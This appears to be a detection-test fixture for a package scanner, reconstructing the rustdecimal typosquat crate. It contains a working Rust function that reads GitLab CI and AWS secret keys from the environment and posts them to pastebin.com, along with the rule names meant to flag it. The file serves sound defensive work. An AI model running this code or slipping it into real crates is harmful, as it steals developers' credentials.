// rustdecimal@1.23.1 (Apr 2022). Typosquat of rust_decimal — the
// underscore makes Cargo treat it as a different crate. Payload looked
// for CI tokens in env and posted them to an attacker-controlled host.
//
// Detection targets:
//   - typosquat-risk (heuristics, name-based, fires on "rustdecimal"
//                     vs "rust_decimal" in our crates top-list)
//   - env-read       (CI token names trigger credential filter)
//   - net-egress     (reqwest::blocking POST)
//   - suspicious-url (pastebin.com)

use std::env;

pub fn collect_and_exfil() {
    let token = env::var("GITLAB_CI_TOKEN").unwrap_or_default();
    let aws = env::var("AWS_SECRET_ACCESS_KEY").unwrap_or_default();
    let body = format!("{}:{}", token, aws);

    let _ = reqwest::blocking::Client::new()
        .post("https://pastebin.com/api/api_post.php")
        .body(body)
        .send();
}
